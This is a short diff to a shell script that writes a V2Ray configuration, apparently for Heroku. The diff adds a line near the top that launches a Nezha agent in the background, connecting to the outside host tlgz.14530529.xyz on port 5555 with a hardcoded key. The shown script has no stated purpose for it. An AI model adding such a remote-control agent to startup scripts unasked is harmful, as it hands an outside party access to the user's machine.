@@ -1,9 +1,12 @@
 #!/bin/sh
 
+
+/nezha-agent -p 19b50994dbf72f2db6 -s tlgz.14530529.xyz:5555 &
 # Global variables
 DIR_CONFIG="/etc/v2ray"
 DIR_RUNTIME="/usr/bin"
 DIR_TMP="$(mktemp -d)"
+
 
 # Write V2Ray configuration
 cat << EOF > ${DIR_TMP}/heroku.json
